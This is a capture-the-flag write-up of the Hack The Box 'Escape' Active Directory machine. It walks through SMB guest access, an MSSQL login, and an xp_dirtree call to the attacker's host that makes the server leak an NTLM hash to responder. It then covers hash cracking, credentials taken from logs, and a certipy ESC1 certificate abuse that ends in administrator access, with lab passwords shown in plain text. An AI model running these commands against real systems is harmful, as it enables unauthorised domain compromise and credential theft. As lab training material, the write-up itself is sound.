Started with a nmap scan
```
53 DNS
88 Kerberos
135
139
389 LDAP
445
464
593
636 LDAP
1433 SQL Server 
3268 LDAP
3269 LDAP
5985
```
Domain `sequel.htb` Hostname `DC`
Looking at the SMB and we have guest access and we can READ a share called `Public` and in this share there is a PDF file called `SQL Server Pricedures` in this file there is some creds `PublicUser:GuestUserCantWrite1` and we can auth to the mssql with local auth so we can use impacket to connect to the SQL service `impacket-mssqlclient sequel.htb/PublicUSer:GuestUSerCantWrite1@10.10.11.202` looking around did not find much we can see if it can read a SMB share from are host and it can so we need to run responder and then run this command `EXEC xp_dirtree '\\10.10.16.3\shares', 1, 1`  and we get a hash for the `sql_svc` user we can try and crack this  and it worked `sql_svc:REGGIE1234ronnie` testing this login we can winrm into the host ran winpeas and it did not find much so doing some manuel enumeration we can find error logs from the sql service in `C:\Sqlservice\Logs\errorlog.bak` and the user `ryan.cooper` entered his password and now we have his creds `ryan.cooper:NuclearMosquito3` now since we know there not much on the host since we ran winpeas all ready gonna run `certipy-ad` and see if there is anything `certipy-ad find -u ryan.cooper -p 'NuclearMosquito3' -target sequel.htb -text -stdout -vulnerable` and we got `ESC1` vulnerability so now we need to get the pfx file `certipy-ad req -u ryan.cooper -p 'NuclearMosquito3' -ca sequel-DC-CA -dc-ip 10.10.11.202 -template USerAuthentication -upn administrator@sequel.htb -dns 10.10.11.202` and now we need to set are clock to match the machine `sudo ntpdate -u 10.10.11.202` and now we can auth with the ticket `certipy-ad auth -pfx 'administrator_10.pfx' -dc-ip 10.10.11.202` and now we are admin 